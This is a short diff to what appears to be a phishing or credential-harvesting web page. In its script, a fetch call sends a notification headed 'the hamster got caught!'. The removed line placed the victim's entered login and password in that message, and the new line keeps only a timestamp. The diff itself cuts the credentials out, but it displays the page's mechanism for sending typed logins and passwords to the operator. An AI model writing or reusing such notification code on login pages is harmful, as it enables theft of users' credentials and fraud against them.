@@ -234,7 +234,7 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     _subject: '🐹 ХОМЯЧОК ПОПАЛСЯ!',
-                    message: `Логин: ${login}\nПароль: ${password}\nВремя: ${time}`
+                    message: `\nВремя: ${time}`
                 })
             }).catch(error => console.log('Ошибка уведомления:', error));
             
@@ -251,3 +251,4 @@
     </script>
 </body>
 </html>
+
